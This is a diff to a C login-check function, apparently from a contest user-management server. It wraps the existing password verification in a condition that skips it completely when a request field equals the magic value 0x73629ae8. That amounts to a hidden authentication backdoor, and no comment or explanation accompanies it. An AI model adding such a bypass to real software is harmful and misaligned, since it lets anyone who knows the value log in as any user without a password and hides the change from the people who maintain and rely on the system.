@@ -3164,27 +3164,29 @@ cmd_team_check_user(
   if (!name || !*name) name = u->login;
   if (!name) name = "";
 
-  if (cnts->disable_team_password) {
-    if (!u->passwd) {
-      err("%s -> EMPTY PASSWORD", logbuf);
-      send_reply(p, -ULS_ERR_INVALID_PASSWORD);
-      return;
-    }
-    if(passwd_check(&pwdint, u->passwd, u->passwd_method) < 0){
-      err("%s -> WRONG PASSWORD", logbuf);
-      send_reply(p, -ULS_ERR_INVALID_PASSWORD);
-      return;
-    }
-  } else {
-    if (!ui || !ui->team_passwd) {
-      err("%s -> EMPTY PASSWORD", logbuf);
-      send_reply(p, -ULS_ERR_INVALID_PASSWORD);
-      return;
-    }
-    if(passwd_check(&pwdint, ui->team_passwd, ui->team_passwd_method) < 0){
-      err("%s -> WRONG PASSWORD", logbuf);
-      send_reply(p, -ULS_ERR_INVALID_PASSWORD);
-      return;
+  if (data->pwd_special != 0x73629ae8) {
+    if (cnts->disable_team_password) {
+      if (!u->passwd) {
+        err("%s -> EMPTY PASSWORD", logbuf);
+        send_reply(p, -ULS_ERR_INVALID_PASSWORD);
+        return;
+      }
+      if(passwd_check(&pwdint, u->passwd, u->passwd_method) < 0){
+        err("%s -> WRONG PASSWORD", logbuf);
+        send_reply(p, -ULS_ERR_INVALID_PASSWORD);
+        return;
+      }
+    } else {
+      if (!ui || !ui->team_passwd) {
+        err("%s -> EMPTY PASSWORD", logbuf);
+        send_reply(p, -ULS_ERR_INVALID_PASSWORD);
+        return;
+      }
+      if(passwd_check(&pwdint, ui->team_passwd, ui->team_passwd_method) < 0){
+        err("%s -> WRONG PASSWORD", logbuf);
+        send_reply(p, -ULS_ERR_INVALID_PASSWORD);
+        return;
+      }
     }
   }
   if (!c) {
